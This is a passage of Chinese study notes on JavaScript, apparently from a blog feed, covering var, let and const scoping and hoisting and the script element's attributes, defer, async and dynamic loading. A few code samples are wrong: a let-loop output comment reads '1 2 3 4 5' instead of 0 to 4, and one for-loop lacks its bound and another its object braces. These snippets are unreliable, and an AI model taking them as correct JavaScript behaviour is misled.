class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> age;    <span class="comment">//所谓的“提升”</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(age);</span><br><span class="line">    age = <span class="number">26</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">foo</span>(); <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="3.3.2-let声明">3.3.2 let声明<a title="#3.3.2-let声明" href="#3.3.2-let声明"></a></h3><ul><li><p><code>let</code>声明的范围的块作用域，而<code>var</code>声明的范围是函数作用域</p><blockquote><p>块作用域是函数作用域的子集</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//var</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> name= <span class="string">&#x27;Matt&#x27;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">//Matt</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">//Matt</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//let</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> age = <span class="number">26</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(age); <span class="comment">//26</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age); <span class="comment">//ReferenceError:age没有定义</span></span><br></pre></td></tr></table></figure></li><li><p><code>let</code>不允许同一个块作用域出现冗余声明</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name;</span><br><span class="line"><span class="keyword">var</span> name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> age;</span><br><span class="line"><span class="keyword">let</span> age; <span class="comment">//SyntaxError; 标识符age</span></span><br></pre></td></tr></table></figure></li><li><p>已经声明JavaScript引擎会记录用于变量声明的标识符及其所在的块作用域</p><p>嵌套使用相同的标识符不会报错，因为同一个块中没有重复声明</p></li></ul><ol><li><p><strong>暂时性死区</strong>：</p><p><code>let</code>声明的变量不会在作用域中被提升</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//name会被提升</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name);  <span class="comment">//undefined</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;Matt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//age不会被提升</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age);   <span class="comment">//ReferenceError:age没有定义</span></span><br><span class="line"><span class="keyword">let</span> age = <span class="number">26</span>;</span><br></pre></td></tr></table></figure><p>在解析代码时，JavaScript引擎也会注意出现在块后面的let声明，只不过在此之前不能以任何方式来引用未声明的变量。在let声明之前的执行瞬间被称为“暂时性死区”，在此阶段引用任何后面才声明的变量都会抛出<code>ReferenceError</code></p></li><li><p><strong>全局声明</strong>：</p><p>与<code>var</code>不同，使用<code>let</code>在全局作用域中声明的变量不会成为<code>window</code>对象的属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;Matt&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">name</span>); <span class="comment">//&#x27;Matt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> age = <span class="number">26</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">window</span>.<span class="property">age</span>); <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure><p>不过<code>let</code>声明仍然是在全局作用域中发生的，相应变量会在页面的生命周期内存续。因此，为了避免<code>SyntaxError</code>，必须确保页面不会重复声明同一个变量</p></li><li><p><strong>条件声明</strong>：</p><p>在使用<code>var</code>声明变量时，由于声明会被提升，JavaScript引擎会自动将多余的声明在作用域顶部合并为一个声明。</p><p><code>let</code>的作用域是块，所以不可能检查前面是否已经使用let声明过同名变量，也就不可能在没有声明的情况声明它。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> name = <span class="string">&#x27;Maiy&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> age = <span class="number">26</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//假设脚本不确定页面是否已经声明了同名变量  那可以假设还没声明过</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> name = <span class="string">&#x27;Matt&#x27;</span>;  <span class="comment">//没有错误，因为可以被作为一个提升声明来处理  不需要检查之前是否声明过同名变量</span></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> age = <span class="number">36</span>; <span class="comment">//如果之前声明过，这里会报错</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用<code>try/catch</code>语句或<code>typeof</code>操作符也不能解决，因为条件块中<code>let</code>声明的作用域仅限于该块。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">let</span> name = <span class="string">&#x27;Maiy&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> age = <span class="number">26</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//假设脚本不确定页面是否已经声明了同名变量  那可以假设还没声明过</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>(<span class="keyword">typeof</span> name === <span class="string">&#x27;undefined&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> name;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//name 被限制在if块作用域内  这个赋值形同全局赋值</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    name = <span class="string">&#x27;Matt&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(age);  <span class="comment">//若无声明过则会报错</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">catch</span>(error)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> age;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//age被限制在catch块的作用域内  这个赋值形同全局赋值</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    age = <span class="number">26</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>对于let不能依赖条件声明模式</p></blockquote></li><li><p><strong>for循环中的let声明</strong>：</p><p>在<code>let</code>出现之前，<code>for</code>循环定义的迭代变量会渗透到循环体外部;</p><p>改使用<code>let</code>之后，就没有这个问题了，因为迭代变量的作用域仅限于<code>for</code>循环块内部；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span> ; i &lt; <span class="number">5</span> ; ++i)&#123;</span><br><span class="line">    <span class="comment">//循环逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(i); <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; <span class="number">5</span> ; ++i)&#123;</span><br><span class="line">    <span class="comment">//循环逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(i); <span class="comment">//ReferenceError：i没有定义</span></span><br></pre></td></tr></table></figure><p>在使用<code>var</code>时，最常见的问题就是对迭代遍历的奇特声明和修改：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span> ; i &lt; <span class="number">5</span> ; i++)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>( <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(i) , <span class="number">0</span>)   <span class="comment">//5 5 5 5 5</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//因为在退出循环时，迭代变量保存的是导致循环退出的值，所以在之后执行超时逻辑是，所有的i都是同一个变量，因而输出同一个值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; <span class="number">5</span> ; i ++)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>( <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(i) , <span class="number">0</span>)   <span class="comment">//1 2 3 4 5</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用let迭代变量时，JavaScript引擎在后台会为每个迭代循环声明一个新的迭代变量。每个setTimeout引用的都是不同的变量实例。</span></span><br></pre></td></tr></table></figure><blockquote><p>这种每次迭代声明一个独立变量实例的行为适用于所有风格for循环，包括<code>for-in</code>和<code>for-of</code>循环</p></blockquote></li></ol><h3 id="3.3.3-const声明">3.3.3 const声明<a title="#3.3.3-const声明" href="#3.3.3-const声明"></a></h3><p><code>const</code>的行为于<code>let</code>基本相同，唯一一个重要的区别：</p><p>用<code>const</code>声明变量时，必须同时初始化变量，且尝试修改<code>const</code>声明的变量会导致运行错误。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> age = <span class="number">26</span>;</span><br><span class="line">age = <span class="number">36</span>; <span class="comment">//TypeError：给常量赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//const也不允许重复声明</span></span><br><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;Matt&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;Maiy&#x27;</span>; <span class="comment">//SyntaxError</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//const声明的作用域也是块</span></span><br><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;MAtt&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> name = <span class="string">&#x27;Maiy&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">//MAtt</span></span><br></pre></td></tr></table></figure><p><code>const</code>声明的限制只适用于它指向的变量的引用。</p><p>即如果<code>const</code>变量引用的是一个对象，那么修改这个对象内部的属性并 不违反<code>const</code>的限制</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> person = &#123;&#125;;</span><br><span class="line">person.<span class="property">name</span> = <span class="string">&#x27;Matt&#x27;</span>; <span class="comment">//没有语法错误</span></span><br></pre></td></tr></table></figure><p>不能用<code>const</code>来声明迭代变量，因为迭代变量会自增</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> i = <span class="number">0</span> ; i &lt;  ; i ++)&#123;&#125; <span class="comment">//TypeError:给常量赋值</span></span><br></pre></td></tr></table></figure><p>若只想用<code>const</code>声明一个不会被修改的<code>for</code>循环变量，也是可以的。</p><p>即每次迭代只是创建一个新变量，这对<code>for-of</code>和<code>for-in</code>循环特别有意义</p>   <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> j = <span class="number">7</span> ; i &lt; <span class="number">5</span> ; i ++)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(j);    <span class="comment">// 7 7 7 7 7 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> key <span class="keyword">in</span> <span class="attr">a</span>: <span class="number">1</span> , <span class="attr">b</span>: <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(key);  <span class="comment">//a b</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> value <span class="keyword">of</span> [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>])&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(value); <span class="comment">//1 2 3 4 5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3.3.4声明风格及最佳实践">3.3.4声明风格及最佳实践<a title="#3.3.4声明风格及最佳实践" href="#3.3.4声明风格及最佳实践"></a></h3><ol><li><p>不使用<code>var</code></p><p>限制自己只使用<code>let</code>和<code>const</code>有助于提升代码质量，因为变量有了明确的作用域、声明位置、以及不变的值。</p></li><li><p><code>const</code>优先，<code>let</code>次之</p><p>使用<code>const</code>声明可以让浏览器运行时强制保持变量不变，也可以让静态代码分析工具提前发现不合法的赋值操作。</p><p>只在提前知道未来会有修改时，再改用<code>let</code>.</p><blockquote><p>这样可以让开发者更有信心地推断某些变量的值永远不会变，同时也能迅速发现因意外赋值导致的非预期行为。</p></blockquote></li></ol><h2 id="3.4-数据类型">3.4 数据类型<a title="#3.4-数据类型" href="#3.4-数据类型"></a></h2>]]></content>
      
      
      <categories>
          
          <category> readNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红宝书 - 第2章 HTML中的JavaScript</title>
      <link href="/readNotes/2.HTML%E4%B8%AD%E7%9A%84JavaScript"/>
      <url>/readNotes/2.HTML%E4%B8%AD%E7%9A%84JavaScript</url>
      
        <content type="html"><![CDATA[<blockquote><p>在JavaScript早期，网景公司的工作人员希望在将JavaScript引入HTML页面的同时，不会导致页面在其他浏览器中渲染初问题</p><p>最终他们达成了向网页中引入通用脚本能力的共识</p><p>当初他们的工作得到了保留，并且最终形成了HTML规范</p></blockquote><h2 id="2.1-&lt;script&gt;元素">2.1 <code>&lt;script&gt;</code>元素<a title="#2.1-&lt;script&gt;元素" href="#2.1-&lt;script&gt;元素"></a></h2><blockquote><p>将JavaScript插入HTML的主要方法是使用<code>&lt;script&gt;</code>元素。这个元素是由网景公司创造出来，并最早在Netscape Navigator2 中实现的。后来，这个元素被正式加入到HTML规范。</p></blockquote><ol><li><strong>其有以下8个属性</strong>：</li></ol><div class="φbq"><div class="φbs"><table><thead><tr><th>属性名</th><th>状态</th><th>作用</th><th>使用</th></tr></thead><tbody><tr><td>async</td><td>可选</td><td>立即开始下载文件，但不能阻止其他页面动作，比如下载资源或等待其他脚本加载</td><td>外部脚本</td></tr><tr><td>charset</td><td>可选</td><td>使用src属性指定的代码字符集</td><td>少用，大多浏览器不在乎它的值</td></tr><tr><td>crossorigin</td><td>可选</td><td>配置相关请求的CORS（跨源资源共享）设置，<br />crossorigin=“anonymous”配置文件请求不必设置凭据标志<br />crossorigin=“use-credentials”设置凭据标志，意味着出站请求会包含凭据</td><td>默认不使用CORS</td></tr><tr><td>defer</td><td>可选</td><td>表示脚本可以延迟到文档完全被解析和显示之后再执行</td><td>外部脚本，IE7及更早版本，行内也有效</td></tr><tr><td>integrity</td><td>可选</td><td>允许对比接收到的资源和指定的加密签名以验证子资源完整性（SRI，Subresource Integrity），如果接收到的资源的签名与这个属性指定的签名不匹配，则页面会报错，脚本不会执行。这个属性可以用于确保内容分发网络（CDN，Content Delivery Network）不会提供恶意内容</td><td></td></tr><tr><td>language</td><td><font color='red'>废弃</font></td><td>最初用于表示代码块中的脚本语言（如：”JavaScript“、”JavaScript1.2“，”VBScript“）</td><td>大多数浏览器都会忽略这个属性</td></tr><tr><td>src</td><td>可选</td><td>表示包含要执行的代码的外部文件</td><td></td></tr><tr><td>type</td><td>可选</td><td>代替language，表示代码块中脚本语言的内容类型（MIME类型）</td><td></td></tr></tbody></table></div></div><blockquote><p>type中：按照惯例，这个值始终都是”text/javascript“，尽管”text/javascript“和”text/ecmascript“都已经废弃了，</p><p>javascript文件的MIME类型通常是”application/x-javascript“，不过给type这个值有可能导致脚本被忽略。</p><p>在非IE浏览器中有效的其他值还有”application/javascript“和”application/javascript“。</p><p>如果这个值是module，则代码会被当成es6模块，只有这时候代码中才能出现import和export关键字</p></blockquote><ol start="2"><li><strong>使用<code>&lt;script&gt;</code>的方式</strong>：</li></ol><ul><li><p>通过它直接在网页中嵌入JavaScript代码</p><ul><li>直接把代码放在<code>&lt;script&gt;</code>元素中就行</li><li>在<code>&lt;script&gt;</code>元素中的代码被计算完成前，页面的其余内容不会被加载，也不会被显示</li><li>注意代码中不能出现<code>&lt;/script&gt;</code>字符串，否则会报错</li><li>if要避免上述问题，只需转义字符“\”</li></ul></li><li><p>通过它在网页中包含外部JavaScript文件</p><ul><li>必须使用src属性</li><li>与解释行内一样，解释外部JavaScript文件时，页面会阻塞（阻塞时间包含下载文件的时间）</li><li>在XHTML中，可以<code>&lt;script src='excample.js' /&gt;</code>，但其是无效的HTML，有些浏览器不能正常处理</li><li>其url指向的资源可以与其HTML页面不在同一个域中<ul><li>例如<code>&lt;script src='http://www.somewhere.com/afile.js'&gt;&lt;/script&gt;</code></li><li>浏览器在解析这个资源时，会向src属性指定的路径发送一个GET请求，以取得相应资源</li><li>这个初始请求不受浏览器同源策略限制</li><li>返回并被执行的JavaScript受限制</li><li>这个请求仍然受父页面HTTP/HTTPS协议的限制</li></ul></li><li>来自外部域的代码会被当成加载它的页面的一部分来加载和解释<ul><li>这个能力可以让我们通过不同的域分发JavaScript</li><li>若引用了别人服务器上的文件，要确保文件不会被替换</li></ul></li></ul><blockquote><p>使用了src属性的<code>&lt;script&gt;</code>元素不应该在标签中再包含其他JavaScript代码，否则浏览器只会下载执行脚本文件，从而忽略行内代码</p></blockquote></li></ul><h3 id="2.1.1-标签位置">2.1.1 标签位置<a title="#2.1.1-标签位置" href="#2.1.1-标签位置"></a></h3><ul><li><p>放在<code>&lt;head&gt;&lt;/head&gt;</code>标签内（过去）</p><blockquote><p>意味着必须把所有的JavaScript代码都下载、解析和解释完成后，才能开始渲染页面，</p><p>若有很多JavaScript文件的页面，会有明显的延迟</p></blockquote></li><li><p><code>&lt;body&gt;</code>元素中的页面内容后面（现代web应用程序）</p></li></ul><h3 id="2.1.2-推迟执行脚本&lt;font-color='red'&gt;defer&lt;/font&gt;">2.1.2 推迟执行脚本<font color='red'><code>defer</code></font><a title="#2.1.2-推迟执行脚本&lt;font-color='red'&gt;defer&lt;/font&gt;" href="#2.1.2-推迟执行脚本&lt;font-color='red'&gt;defer&lt;/font&gt;"></a></h3><p>HTML4.01定义了<code>defer</code>属性，表示脚本在执行时不会改变页面的结构。即脚本会被延迟到整个页面都解析完毕后再运行</p><blockquote><p>告诉浏览器立即下载，但延迟执行</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">&#x27;example.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- if XHTML </span></span><br><span class="line"><span class="comment">defer=&quot;defer&quot;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p>HTML5规范要求脚本应该按照他们出现的顺序执行，且均会在DOMContentLoaded事件之前执行；</p><p>但实际中，推迟执行的脚本不一定总会按照顺序执行或者再DOMContentLoaded事件之前执行；</p><p>因此最好只包含一个这样的脚本。</p><blockquote><p>对<code>defer</code>属性的支持时从IE4、Firefox3.5、Safari5和Chrome7开始的。其他浏览器会忽略这个属性，所以还是把要延迟的脚本放在页面底部比较好</p></blockquote><h3 id="2.1.3-异步执行脚本">2.1.3 异步执行脚本<a title="#2.1.3-异步执行脚本" href="#2.1.3-异步执行脚本"></a></h3><p>HTML5定义了<code>async</code>属性，其与<code>defer</code>类似，都只适用于外部脚本，都会告诉浏览器立即开始下载。</p><p>但<code>async</code>不能保证他们按照他们出现的次序执行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">&#x27;example1.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">&#x27;example2.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- if XHTML </span></span><br><span class="line"><span class="comment">async=&quot;async&quot;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>告诉浏览器，不必等脚本下载和执行完后再加载页面，同样也不必等到该异步脚本下载和执行后再加载其他脚本，所以异步脚本不应该在加载期间修改DOM。</p></blockquote><p>异步脚本保证会在load事件前执行，但可能会在DOMContentLoaded之前/后；</p><p>使用其也会告诉页面，你不会使用document.write；</p><blockquote><p>Firefox3.6、Safari5和Chrome7支持异步脚本；</p></blockquote><h3 id="2.1.4-动态加载脚本">2.1.4 动态加载脚本<a title="#2.1.4-动态加载脚本" href="#2.1.4-动态加载脚本"></a></h3><p>因为JavaScript可以使用DOM API，所以通过向DOM中动态添加<code>script</code>元素同样可以加载指定的脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>); <span class="comment">//创建</span></span><br><span class="line">script.<span class="property">src</span>=<span class="string">&#x27;gibbarish.js&#x27;</span>;</span><br><span class="line"><span class="comment">//默认以这种方式创建的`script`是异步加载的，相当于添加了async，但可能会有问题</span></span><br><span class="line"><span class="comment">//因为所有浏览器支持createElement()方法，但不是所有浏览器都支持async属性</span></span><br><span class="line"><span class="comment">//所以为了统一动态脚本的加载行为，可以明确将其设置为同步加载</span></span><br><span class="line">script.<span class="property">async</span>=<span class="literal">false</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);<span class="comment">//添加到页面上</span></span><br></pre></td></tr></table></figure><blockquote><p>以这种方式获取的资源对浏览器预加载器是不可见的，会影响它们在资源获取队列中的优先级。根据应用程序的工作方式以及怎么使用，这种方式可能会严重影响性能</p></blockquote><p>要想让预加载器知道这些动态请求文件的存在，可以在文档头部显示声明它们：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&#x27;preload&#x27;</span> <span class="attr">href</span>=<span class="string">&#x27;gibberish.js&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2.1.5-xhtml中的变化">2.1.5 XHTML中的变化<a title="#2.1.5-xhtml中的变化" href="#2.1.5-xhtml中的变化"></a></h3><p>可扩展性文本标记语言（XHTML，Extensible HyperText Markup Language）是将HTML作为XML的应用重新包装的结果。</p><p>在XTML中使用JavaScript必须指定<code>type=text/javascript</code>，HTML则可以没有。</p><blockquote><p>XHTML虽然已经退出历史舞台，但实践中偶尔可能也会遇到遗留代码</p></blockquote><p>在XHTML中编写代码比较严格，</p><ul><li><p>在编写JavaScript时，小于号<code>&lt;</code>会被解释成一个标签的开始，并且由于作为开始标签的小于号后面不能有空格，所以<code>if(a &lt; b)</code>这样的代码会报错；以下是避免这种错误的方法：</p><ul><li><p>把所有小于号<code>&lt;</code>都替换成对应的HTML实体形式<code>&amp;lt;</code>，即<code>if(a &amp;lt; b)</code></p></li><li><p>把所有代码都包含到一个CDATA块中</p><blockquote><p>在XHTML/XML中，CDATA块表示文档中可以包含任意文本的区块，其内容不作为标签来解析，因此可以在其中包含任意字符</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="language-handlebars"><span class="language-xml">&lt;![CDATA[</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        function compare(a , b)&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            if(a &lt; b)&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                console.log(&quot;a &lt; b&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            &#125;...</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    ]]&gt;</span></span><span class="tag">&lt;/<span 